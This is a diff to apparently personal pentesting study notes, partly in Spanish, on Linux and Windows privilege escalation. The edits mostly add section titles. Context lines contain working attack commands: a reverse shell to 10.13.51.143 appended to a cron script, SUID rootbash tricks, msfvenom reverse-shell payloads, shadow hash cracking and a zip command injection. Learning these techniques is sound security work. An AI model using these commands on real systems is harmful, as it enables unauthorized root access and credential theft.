@@ -168,7 +168,7 @@ sudo -u root /bin/bash
 
 <div class="markdown-embed-title">
 
-# netstat
+### netstat
 
 </div>
 
@@ -213,7 +213,7 @@ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 
 <div class="markdown-embed-title">
 
-# ### lse
+### lse
 
 </div>
 
@@ -234,6 +234,11 @@ execute more deep scan
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### LinEnum
+
+</div>
 
 
 ```shell
@@ -245,6 +250,11 @@ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && c
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### pspy
+
+</div>
 
 
 - snoop on processes without need for root permissions.
@@ -258,6 +268,11 @@ https://github.com/DominicBreuker/pspy/releases
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### LES
+
+</div>
 
 
 - System enumeration - Automated
@@ -274,6 +289,11 @@ perl linux-exploit-suggester-2.pl
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Linux Smart Enumeration
+
+</div>
 
 
 - [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
@@ -284,6 +304,11 @@ perl linux-exploit-suggester-2.pl
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Linux Priv Checker
+
+</div>
 
 
 - [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
@@ -311,6 +336,11 @@ Example: Apache2 ant the `-f` parameter used to load the `/etc/shadow`, this wil
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### sudo Environment Variables
+
+</div>
 
 
 - Sudo can be configured to **inherit** certain environment **variables from the user**'s environment.
@@ -369,6 +399,11 @@ find / -perm -g=s -type f -ls 2>/dev/null
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Scaling Known exploits
+
+</div>
 
 
 - Find a known exploit. [Exploit-DB](https://www.exploit-db.com/), Google, and GitHub are good places to search!
@@ -383,6 +418,11 @@ find / -perm -g=s -type f -ls 2>/dev/null
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Scaling Shared Object injection
+
+</div>
 
 
 - If we have a executable
@@ -412,6 +452,11 @@ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcal
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### SUID exploit enviroment var
+
+</div>
 
 
 - If an executable can be exploited due to it inheriting the user's PATH and attempting to execute programs without specifying an absolute path.
@@ -439,6 +484,11 @@ export PATH=/path_to_executable:$PATH
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Scaling Abusing shell
+
+</div>
 
 
 ## Bash versions below `4.2-048`
@@ -474,6 +524,11 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootba
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Python SUID
+
+</div>
 
 
 set to root
@@ -501,6 +556,11 @@ with sys module too
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+## Capabilities
+
+</div>
 
 
 ## Ver y cambiar capabilities
@@ -558,6 +618,11 @@ Hasta la versión 2.4.18 de Linux, las siguientes capacidades están implementad
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+## PATH exploiting
+
+</div>
 
 
 - If we have [[Operative System/Linux/Permisos/SUID\|SUID]] binary
@@ -582,6 +647,11 @@ Check which folders can I write.
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Writable passwd
+
+</div>
 
 
 ### Create a new user
@@ -613,6 +683,11 @@ Edit the `/etc/passwd` file and place the generated password hash between the fi
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Readable shadow - cracking hashes
+
+</div>
 
 
 - The /etc/shadow file is the file on Linux machines where password hashes are stored.
@@ -650,6 +725,11 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Writeable shadow
+
+</div>
 
 
 Generate a new password hash with a password of your choice:
@@ -677,6 +757,11 @@ Look for jobs, and try to exploit them
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Cron exploit - File permissions
+
+</div>
 
 
 check permissions of the scripts
@@ -691,6 +776,11 @@ echo 'bash -i>&/dev/tcp/10.13.51.143/4747 0>&1' >> /script.sh
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Cron exploit - PATH
+
+</div>
 
 
 - check the crontabs
@@ -716,6 +806,11 @@ chmod +xs /tmp/rootbash
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Cron exploit - Wildcards
+
+</div>
 
 
 - Check the scripts with tar, 7z, rsync, etc.
@@ -772,6 +867,11 @@ if a file is found, in temp create a script and exec the code
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Check history files
+
+</div>
 
 
 - Check If a user accidentally types their password
@@ -787,6 +887,11 @@ cat ~/.*history | less
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Check config files
+
+</div>
 
 
 - Config files often contain passwords in plaintext or other reversible formats.
@@ -802,6 +907,11 @@ cat /home/user/myvpn.ovpn
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Check SSH keys
+
+</div>
 
 
 - Sometimes **users make backups** of important files but **fail** to secure them **with** the correct **permissions**.
@@ -813,6 +923,11 @@ cat /home/user/myvpn.ovpn
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Weak-reused-plaintext passwords
+
+</div>
 
 
 - Check file where webserver connect to database (`config.php` or similar)
@@ -845,6 +960,11 @@ username:password
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+## NFS
+
+</div>
 
 
 ## NFS exploitation
@@ -919,6 +1039,11 @@ chmod +xs exploit_file
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+## User Installed Software
+
+</div>
 
 
 - some third party software that might be vulnerable?. If you find anything google it for exploits.
@@ -991,6 +1116,11 @@ Exit out of the MySQL shell (type **exit** or **\q** and press **Enter**) and 
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+## Wildcard spare
+
+</div>
 
 
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
@@ -1066,6 +1196,11 @@ zip name.zip files -T --unzip-command "sh -c whoami"
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+## Service only available from inside
+
+</div>
 
 
 - It might be the user is running some service that is only available from that host.
@@ -1086,6 +1221,11 @@ netstat -ano
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+## Unmounted filesystems
+
+</div>
 
 
 - looking for any unmounted filesystems.
@@ -1105,6 +1245,11 @@ cat /etc/fstab
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### LES
+
+</div>
 
 
 - System enumeration - Automated
@@ -1117,7 +1262,7 @@ perl linux-exploit-suggester-2.pl
 
 </div></div>
 
-### [[Hacking Ético y Pentesting/DirtyCow\|DirtyCow]]
+### [[Hacking Ético y Pentesting/DirtyCow\|###{{title}}]]
 
 # Windows privesc
 
@@ -1125,6 +1270,11 @@ perl linux-exploit-suggester-2.pl
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### winPEAS
+
+</div>
 
 
 https://github.com/peass-ng/PEASS-ng/releases
@@ -1138,6 +1288,11 @@ wget https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/wi
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### powerup
+
+</div>
 
 
 - clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.
@@ -1165,6 +1320,11 @@ msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shik
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Unquoted Service Paths
+
+</div>
 
 
 - To windows
@@ -1178,6 +1338,11 @@ msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shik
 ### 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+### Service Object Permissions
+
+</div>
 
 
  - Los permisos de servicio mal configurados pueden permitir a un atacante modificar o reconfigurar los atributos asociados a ese servicio
@@ -1188,6 +1353,11 @@ msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shik
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+## DLL hijacking
+
+</div>
 
 
 Replace the DLL by a malicious
@@ -1206,6 +1376,11 @@ Tools
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+## Library hijack
+
+</div>
 
 
 OSX
@@ -1219,6 +1394,11 @@ OSX
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+## Spectre and meltdown
+
+</div>
 
 
 Spectre y Meltdown son vulnerabilidades encontradas en el diseño de los modernos chips procesadores de AMO, ARM e
@@ -1237,6 +1417,11 @@ Vulnerabilidad Meltdown
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+## Named pipe impersonation
+
+</div>
 
 
 - In windows
@@ -1247,10 +1432,37 @@ Vulnerabilidad Meltdown
 
 </div></div>
 
-## ![[Unattended lnstalls \|Unattended lnstalls ]]
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+## Unattended lnstalls
+
+</div>
+
+
+- In wondows 32
+- Los detalles de la instalación desatendida, como los ajustes de configuración utilizados durante el proceso de instalación, se almacenan en el archivo Unattend.xml.
+- El archivo Unattend.xml se almacena en una de las siguientes ubicaciones:
+
+C: \Windows\Panther\\N de la siguiente manera
+C: \Windows\Panther\NUnattend
+C: \WindowsSystem32
+C: \WindowsSystem32
+
+Los atacantes explotan la información almacenada en Unattend.xml para escalar privilegios
+
+</div></div>
+
+## 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+<div class="markdown-embed-title">
+
+## Other techniques
+
+</div>
 
 
 - Manipulación de tokens de acceso
@@ -1279,6 +1491,11 @@ Una shell web es un script basado en la web que permite el acceso a un servidor 
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+## tools to escalate
+
+</div>
 
 
 ### BeRoot 
@@ -1293,6 +1510,11 @@ que puede ser utilizada para escalar privilegios en el sistema objetivo. Como se
 ## 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+## How to defend escalate Windows
+
+</div>
 
 
 ■ Restringir los privilegios de inicio de sesión interactiva.
@@ -1339,6 +1561,11 @@ arbitrario.
 # 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
+<div class="markdown-embed-title">
+
+# Pivoting and relaying
+
+</div>
 
 
 - Los atacantes utilizan la técnica de pivoteo para comprometer un sistema, obtener un acceso shell remoto en él, y además saltarse el firewall para pivotear a el sistema comprometido para acceder a otros sistemas vulnerables en la red.
